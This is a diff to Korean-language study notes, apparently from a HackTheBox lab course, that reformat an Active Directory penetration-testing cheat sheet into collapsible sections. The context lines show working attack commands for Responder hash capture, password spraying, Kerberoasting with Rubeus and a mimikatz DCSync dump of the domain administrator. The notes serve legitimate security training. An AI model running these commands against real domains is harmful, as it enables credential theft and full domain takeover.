@@ -1,5 +1,5 @@
-# Active Directory 침투 테스트 가이드
-## 네트워크 스캔 및 호스트 탐색
+<details>
+  <summary><strong>네트워크 스캔 및 호스트 탐색</strong></summary>
 
 ### FPing
 > 빠른 네트워크 스캔을 위한 도구로, 활성 호스트를 신속하게 식별
@@ -10,11 +10,13 @@ fping -asgq 172.16.5.0/23
 
 # 발견된 호스트에 대한 상세 스캔 수행
 sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
-```
+```  
+  
+</details>
 
 ---
-
-## 사용자 열거
+<details>
+  <summary><strong>사용자 열거</strong></summary>
 
 ### Kerbrute
 > Kerberos 프로토콜을 이용한 유효한 도메인 사용자 계정 열거
@@ -73,10 +75,12 @@ rpcclient -U "" -N 172.16.5.5
 # 도메인 사용자 열거
 rpcclient $> enumdomusers
 ```
+  
+</details>
 
 ---
-
-## 네트워크 공격
+<details>
+  <summary><strong>네트워크 공격</strong></summary>
 
 ### Responder
 > LLMNR, NBT-NS, MDNS 스푸핑을 통한 자격증명 수집 (Linux)
@@ -101,10 +105,12 @@ GET NTLMV2UNIQUE
 # 캡처된 사용자명 목록 확인
 GET NTLMV2USERNAMES
 ```
+  
+</details>
 
 ---
-
-## 패스워드 정책 확인
+<details>
+  <summary><strong>패스워드 정책 확인</strong></summary>
 
 ### CrackMapExec
 > SMB를 통한 도메인 패스워드 정책 확인
@@ -173,10 +179,12 @@ import-module .\PowerView.ps1
 # 도메인 정책 조회
 Get-DomainPolicy
 ```
+  
+</details>
 
 ---
-
-## 패스워드 스프레이 공격
+<details>
+  <summary><strong>패스워드 스프레이 공격</strong></summary>
 
 > 계정 잠금을 피하면서 여러 계정에 동일한 패스워드를 시도하는 공격
 
@@ -208,10 +216,12 @@ Import-Module .\DomainPasswordSpray.ps1
 # 패스워드 스프레이 수행 및 성공 결과 파일 저장
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
+  
+</details>
 
 ---
-
-## 자격증명 열거
+<details>
+  <summary><strong>자격증명 열거</strong></summary>
 
 > 유효한 자격증명을 획득한 후 도메인 정보 수집
 
@@ -363,10 +373,12 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 **BloodHound 유용한 쿼리:**
 - `Find Computers with Unsupported Operating Systems` - 지원 종료된 OS 찾기
 - `Find Computers where Domain Users are Local Admin` - Domain Users가 로컬 관리자인 컴퓨터 찾기
+  
+</details>
 
 ---
-
-## Kerberoasting 공격
+<details>
+  <summary><strong>Kerberoasting 공격</strong></summary>
 
 > SPN이 설정된 서비스 계정의 TGS 티켓을 요청하여 오프라인 크래킹
 
@@ -402,10 +414,12 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 # 특정 사용자 타겟팅 (TGT 위임 사용)
 .\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
 ```
+  
+</details>
 
 ---
-
-## DCSync 공격
+<details>
+  <summary><strong>DCSync 공격</strong></summary>
 
 > Domain Controller를 모방하여 도메인 자격증명 덤프
 
@@ -439,10 +453,12 @@ mimikatz # privilege::debug
 # DCSync로 관리자 계정의 자격증명 덤프
 mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
 ```
+  
+</details>
 
 ---
-
-## 횡적 이동 (Lateral Movement)
+<details>
+  <summary><strong>횡적 이동 (Lateral Movement)</strong></summary>
 
 ### RDP (Remote Desktop Protocol)
 
@@ -496,3 +512,5 @@ Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\dam
 # Windows 인증을 사용한 MSSQL 연결
 mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
 ```
+
+</details>
